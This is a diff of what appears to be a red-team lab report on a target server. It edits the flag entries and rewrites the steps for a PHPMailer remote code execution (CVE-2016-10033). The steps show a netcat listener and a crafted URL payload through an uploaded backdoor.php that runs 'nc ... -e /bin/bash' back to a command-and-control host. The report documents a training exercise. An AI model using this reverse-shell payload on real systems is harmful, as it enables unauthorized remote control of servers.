@@ -35,7 +35,7 @@ Vulnerability | Description | Impact
 
 The Red Team was able to penetrate Target 2 and retrieve the following confidential data:
 
-**flag1:**  `flag1{a2c1f66d28051bd3a5874b5b6r43e21}`
+**flag1.txt:**  `a2c1f66d28051bd3a5874b5b6r43e21`
 
 - **CWE-548** Exposure of information through directory browsing
     
@@ -51,34 +51,30 @@ The Red Team was able to penetrate Target 2 and retrieve the following confident
 
 ---
 
-**flag2:**  `flag2{6a8ed560f0b5358ecf844108048eb337}`
+**flag2.txt:**  `6a8ed560f0b5358ecf844108048eb337`
 
-**flag3:**  `flag3{a0f568aa9de277887f37730d71520d9b}`
+**flag3.txt:**  `a0f568aa9de277887f37730d71520d9b`
 
 - **CVE-2016-10033** Remote Code Execution Vulnerability in PHPMailer
 
     The current version of PHPMailer in use (5.2.16) is vulnerable. It allows extra parameters in the mail command and consequently executes arbitrary code. Therefore, the exploited machine can establish stealthy communication with a Command and Control through a reverse shell that will bypass the inbound rules of a firewall.
 
-    1. Execution of the script to exploit PHPMailer. This script will upload a file called backdoor.php to the target server allowing the execution of command injection attacks.
+    1. First, a customized script uploads a file to the vulnerable machine. The file allows the execution of NetCat in the exploited machine.
 
-            ./exploit.sh
+    2.  Second, a Command and Control is configured to listen using a NetCat command. 
 
-        ![15](/Images/4/15.PNG)
+    3. Finally, the exploited machine is instructed to call the Command and Control via a designed payload running in a browser. The payload has embedded a Netcat command to call the Command and Control machine.
 
-    2. Set the Command and Control Machine to listen using the NetCat command.
-
-            nc -lnvp 4444
-
-        ![16](/Images/4/16.PNG)
-
-    19. Make that the exploited machine calls to the Command and Control Machine using a NetCat command embedded in a payload after running the payload in the browser.
-
-            192.168.1.115/backdoor.php?cmd=nc 192.168.1.101 4444 -e /bin/bash  
+        **Crafted payload:** `192.168.1.115/backdoor.php?cmd=nc 192.168.1.101 4444 -e /bin/bash`
 
         ![17](/Images/4/17.PNG)
 
-    20. Sensitive information was found in the "www" and "WordPress uploads" directory    
+        **Sensitive information was found in the "www" and "WordPress uploads" directory**    
+
+        **flag2**
 
         ![19](/Images/4/19.PNG)
+
+        **flag3**
 
         ![20](/Images/4/20.png)
